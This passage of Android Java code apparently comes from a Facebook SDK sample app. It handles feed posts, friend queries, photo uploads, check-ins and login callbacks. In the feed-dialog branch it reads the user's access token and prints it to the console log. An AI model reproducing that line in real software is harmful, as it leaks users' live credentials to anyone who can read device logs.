		case AUTHORIZE_ACTIVITY_RESULT_CODE: {
			Utility.mFacebook.authorizeCallback(requestCode, resultCode, data);
			break;
		}
		/*
		 * if this is the result for a photo picker from the gallery, upload the
		 * image after scaling it. You can use the Utility.scaleImage() function
		 * for scaling
		 */
		case PICK_EXISTING_PHOTO_RESULT_CODE: {
			if (resultCode == Activity.RESULT_OK) {
				Uri photoUri = data.getData();
				if (photoUri != null) {
					Bundle params = new Bundle();
					try {
						params.putByteArray("photo", Utility.scaleImage(
								getApplicationContext(), photoUri));
					} catch (IOException e) {
						e.printStackTrace();
					}
					params.putString("caption",
							"FbAPIs Sample App photo upload");
					Utility.mAsyncRunner.request("me/photos", params, "POST",
							new PhotoUploadListener(), null);
				} else {
					Toast.makeText(getApplicationContext(),
							"Error selecting image from the gallery.",
							Toast.LENGTH_SHORT).show();
				}
			} else {
				Toast.makeText(getApplicationContext(),
						"No image selected for upload.", Toast.LENGTH_SHORT)
						.show();
			}
			break;
		}
		}
	}

	@Override
	public void onItemClick(AdapterView<?> arg0, View v, int position, long arg3) {
		switch (position) {		
		case 0: {
			Bundle params = new Bundle();
			params.putString("caption", getString(R.string.app_name));
			params.putString("description", getString(R.string.app_desc));
			params.putString("picture", Utility.HACK_ICON_URL);
			params.putString("name", getString(R.string.app_action));

			Utility.mFacebook.dialog(SocialMinemain.this, "feed", params,
					new UpdateStatusListener());
			String access_token = Utility.mFacebook.getAccessToken();
			System.out.println(access_token);
			break;
		}

		/*
		 * Source Tag: app_requests Send an app request to friends. If no friend
		 * is specified, the user will see a friend selector and will be able to
		 * select a maximum of 50 recipients. To send request to specific
		 * friend, provide the uid in the 'to' parameter Refer to
		 * https://developers.facebook.com/docs/reference/dialogs/requests/ for
		 * more info.
		 */
		case 1: {
			Bundle params = new Bundle();
			params.putString("message", getString(R.string.request_message));
			Utility.mFacebook.dialog(SocialMinemain.this, "apprequests",
					params, new AppRequestsListener());
			break;
		}

		/*
		 * Source Tag: friends_tag You can get friends using
		 * graph.facebook.com/me/friends, this returns the list sorted by UID OR
		 * using the friend table. With this you can sort the way you want it.
		 * Friend table -
		 * https://developers.facebook.com/docs/reference/fql/friend/ User table
		 * - https://developers.facebook.com/docs/reference/fql/user/
		 */
		case 2: {
			if (!Utility.mFacebook.isSessionValid()) {
				Util.showAlert(this, "Warning", "You must first log in.");
			} else {
				dialog = ProgressDialog.show(SocialMinemain.this, "",
						getString(R.string.please_wait), true, true);
				new AlertDialog.Builder(this)
						.setTitle(R.string.Graph_FQL_title)
						.setMessage(R.string.Graph_FQL_msg)
						.setPositiveButton(R.string.graph_button,
								new DialogInterface.OnClickListener() {
									@Override
									public void onClick(DialogInterface dialog,
											int which) {
										graph_or_fql = "graph";
										Bundle params = new Bundle();
										params.putString("fields",
												"name, picture, location");
										Utility.mAsyncRunner.request(
												"me/friends", params,
												new FriendsRequestListener());
									}

								})
						.setNegativeButton(R.string.fql_button,
								new DialogInterface.OnClickListener() {
									@Override
									public void onClick(DialogInterface dialog,
											int which) {
										graph_or_fql = "fql";
										String query = "select name, current_location, uid, pic_square from user where uid in (select uid2 from friend where uid1=me()) order by name";
										Bundle params = new Bundle();
										params.putString("method", "fql.query");
										params.putString("query", query);
										Utility.mAsyncRunner.request(null,
												params,
												new FriendsRequestListener());
									}

								})
						.setOnCancelListener(
								new DialogInterface.OnCancelListener() {
									@Override
									public void onCancel(DialogInterface d) {
										dialog.dismiss();
									}
								}).show();
			}
			break;
		}

		/*
		 * Source Tag: upload_photo You can upload a photo from the media
		 * gallery or from a remote server How to upload photo:
		 * https://developers.facebook.com/blog/post/498/
		 */
		case 3: {
			if (!Utility.mFacebook.isSessionValid()) {
				Util.showAlert(this, "Warning", "You must first log in.");
			} else {
				dialog = ProgressDialog.show(SocialMinemain.this, "",
						getString(R.string.please_wait), true, true);
				new AlertDialog.Builder(this)
						.setTitle(R.string.gallery_remote_title)
						.setMessage(R.string.gallery_remote_msg)
						.setPositiveButton(R.string.gallery_button,
								new DialogInterface.OnClickListener() {
									@Override
									public void onClick(DialogInterface dialog,
											int which) {
										Intent intent = new Intent(
												Intent.ACTION_PICK,
												(MediaStore.Images.Media.EXTERNAL_CONTENT_URI));
										startActivityForResult(intent,
												PICK_EXISTING_PHOTO_RESULT_CODE);
									}

								})
						.setNegativeButton(R.string.remote_button,
								new DialogInterface.OnClickListener() {
									@Override
									public void onClick(DialogInterface dialog,
											int which) {
										/*
										 * Source tag: upload_photo_tag
										 */
										Bundle params = new Bundle();
										params.putString("url",
												"http://www.facebook.com/images/devsite/iphone_connect_btn.jpg");
										params.putString("caption",
												"FbAPIs Sample App photo upload");
										Utility.mAsyncRunner
												.request(
														"me/photos",
														params,
														"POST",
														new PhotoUploadListener(),
														null);
									}

								})
						.setOnCancelListener(
								new DialogInterface.OnCancelListener() {
									@Override
									public void onCancel(DialogInterface d) {
										dialog.dismiss();
									}
								}).show();
			}
			break;
		}

		/*
		 * User can check-in to a place, you require publish_checkins permission
		 * for that. You can use the default Times Square location or fetch
		 * user's current location. Get user's checkins:
		 * https://developers.facebook.com/docs/reference/api/checkin/
		 */
		case 4: {
			final Intent myIntent = new Intent(getApplicationContext(),
					Places.class);

			new AlertDialog.Builder(this)
					.setTitle(R.string.get_location)
					.setMessage(R.string.get_default_or_new_location)
					.setPositiveButton(R.string.current_location_button,
							new DialogInterface.OnClickListener() {
								@Override
								public void onClick(DialogInterface dialog,
										int which) {
									myIntent.putExtra("LOCATION", "current");
									startActivity(myIntent);
								}
							})
					.setNegativeButton(R.string.times_square_button,
							new DialogInterface.OnClickListener() {
								@Override
								public void onClick(DialogInterface dialog,
										int which) {
									myIntent.putExtra("LOCATION",
											"times_square");
									startActivity(myIntent);
								}

							}).show();
			break;
		}

		case 5: {
			if (!Utility.mFacebook.isSessionValid()) {
				Util.showAlert(this, "Warning", "You must first log in.");
			} else {
				new FQLQuery(SocialMinemain.this).show();
			}
			break;
		}
		/*
		 * This is advanced feature where you can request new permissions
		 * Browser user's graph, his fields and connections. This is similar to
		 * the www version: http://developers.facebook.com/tools/explorer/
		 */
		case 6: {
			Intent myIntent = new Intent(getApplicationContext(),
					GraphExplorer.class);
			if (Utility.mFacebook.isSessionValid()) {
				Utility.objectID = "me";
			}
			startActivity(myIntent);
			break;
		}

		case 7: {
			if (!Utility.mFacebook.isSessionValid()) {
				Util.showAlert(this, "Warning", "You must first log in.");
			} else {
				new TokenRefreshDialog(SocialMinemain.this).show();
			}
		}
		}
	}

	/*
	 * callback for the feed dialog which updates the profile status
	 */
	public class UpdateStatusListener extends BaseDialogListener {
		@Override
		public void onComplete(Bundle values) {
			final String postId = values.getString("post_id");
			if (postId != null) {
				new UpdateStatusResultDialog(SocialMinemain.this,
						"Update Status executed", values).show();
			} else {
				Toast toast = Toast.makeText(getApplicationContext(),
						"No wall post made", Toast.LENGTH_SHORT);
				toast.show();
			}
		}

		@Override
		public void onFacebookError(FacebookError error) {
			Toast.makeText(getApplicationContext(),
					"Facebook Error: " + error.getMessage(), Toast.LENGTH_SHORT)
					.show();
		}

		@Override
		public void onCancel() {
			Toast toast = Toast.makeText(getApplicationContext(),
					"Update status cancelled", Toast.LENGTH_SHORT);
			toast.show();
		}
	}

	/*
	 * callback for the apprequests dialog which sends an app request to user's
	 * friends.
	 */
	public class AppRequestsListener extends BaseDialogListener {
		@Override
		public void onComplete(Bundle values) {
			Toast toast = Toast.makeText(getApplicationContext(),
					"App request sent", Toast.LENGTH_SHORT);
			toast.show();
		}

		@Override
		public void onFacebookError(FacebookError error) {
			Toast.makeText(getApplicationContext(),
					"Facebook Error: " + error.getMessage(), Toast.LENGTH_SHORT)
					.show();
		}

		@Override
		public void onCancel() {
			Toast toast = Toast.makeText(getApplicationContext(),
					"App request cancelled", Toast.LENGTH_SHORT);
			toast.show();
		}
	}

	/*
	 * callback after friends are fetched via me/friends or fql query.
	 */
	public class FriendsRequestListener extends BaseRequestListener {

		@Override
		public void onComplete(final String response, final Object state) {
			dialog.dismiss();
			Intent myIntent = new Intent(getApplicationContext(),
					FriendsList.class);
			myIntent.putExtra("API_RESPONSE", response);
			myIntent.putExtra("METHOD", graph_or_fql);
			startActivity(myIntent);
		}

		public void onFacebookError(FacebookError error) {
			dialog.dismiss();
			Toast.makeText(getApplicationContext(),
					"Facebook Error: " + error.getMessage(), Toast.LENGTH_SHORT)
					.show();
		}
	}

	/*
	 * callback for the photo upload
	 */
	public class PhotoUploadListener extends BaseRequestListener {

		@Override
		public void onComplete(final String response, final Object state) {
			dialog.dismiss();
			mHandler.post(new Runnable() {
				@Override
				public void run() {
					new UploadPhotoResultDialog(SocialMinemain.this,
							"Upload Photo executed", response).show();
				}
			});
		}

		public void onFacebookError(FacebookError error) {
			dialog.dismiss();
			Toast.makeText(getApplicationContext(),
					"Facebook Error: " + error.getMessage(), Toast.LENGTH_LONG)
					.show();
		}
	}

	public class FQLRequestListener extends BaseRequestListener {

		@Override
		public void onComplete(final String response, final Object state) {
			mHandler.post(new Runnable() {
				@Override
				public void run() {
					Toast.makeText(getApplicationContext(),
							"Response: " + response, Toast.LENGTH_LONG).show();
				}
			});
		}

		public void onFacebookError(FacebookError error) {
			Toast.makeText(getApplicationContext(),
					"Facebook Error: " + error.getMessage(), Toast.LENGTH_LONG)
					.show();
		}
	}

	/*
	 * Callback for fetching current user's name, picture, uid.
	 */
	public class UserRequestListener extends BaseRequestListener {

		@Override
		public void onComplete(final String response, final Object state) {
			JSONObject jsonObject;
			try {
				jsonObject = new JSONObject(response);

				final String picURL = jsonObject.getString("picture");
				final String name = jsonObject.getString("name");
				Utility.userUID = jsonObject.getString("id");

				mHandler.post(new Runnable() {
					@Override
					public void run() {
						mText.setText("Welcome " + name + "!");
						mUserPic.setImageBitmap(Utility.getBitmap(picURL));
					}
				});

			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	/*
	 * The Callback for notifying the application when authorization succeeds or
	 * fails.
	 */

	public class FbAPIsAuthListener implements AuthListener {

		@Override
		public void onAuthSucceed() {
			requestUserData();
		}

		@Override
		public void onAuthFail(String error) {
			mText.setText("Login Failed: " + error);
		}
	}

	/*
	 * The Callback for notifying the application when log out starts and
	 * finishes.
	 */
	public class FbAPIsLogoutListener implements LogoutListener {
		@Override
		public void onLogoutBegin() {
			mText.setText("Logging out...");
		}

		@Override
		public void onLogoutFinish() {
			mText.setText("You have logged out! ");
			mUserPic.setImageBitmap(null);
		}
	}

	/*
	 * Request user name, and picture to show on the main screen.
	 */
	public void requestUserData() {
		mText.setText("Fetching user name, profile pic...");
		Bundle params = new Bundle();
		params.putString("fields", "name, picture");
		Utility.mAsyncRunner.request("me", params, new UserRequestListener());
	}

	/**
	 * Definition of the list adapter
	 */
	public class MainListAdapter extends BaseAdapter {
		private LayoutInflater mInflater;

		public MainListAdapter() {
			mInflater = LayoutInflater.from(SocialMinemain.this
					.getBaseContext());
		}

		@Override
		public int getCount() {
			return main_items.length;
		}

		@Override
		public Object getItem(int position) {
			return null;
		}

		@Override
		public long getItemId(int position) {
			return 0;
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {

			View hView = convertView;
			if (convertView == null) {
				hView = mInflater.inflate(R.layout.main_list_item, null);
				ViewHolder holder = new ViewHolder();
				holder.main_list_item = (TextView) hView
						.findViewById(R.id.main_api_item);
				hView.setTag(holder);
			}

			ViewHolder holder = (ViewHolder) hView.getTag();

			holder.main_list_item.setText(main_items[position]);

			return hView;
		}

	}

	class ViewHolder {
		TextView main_list_item;
	}

}
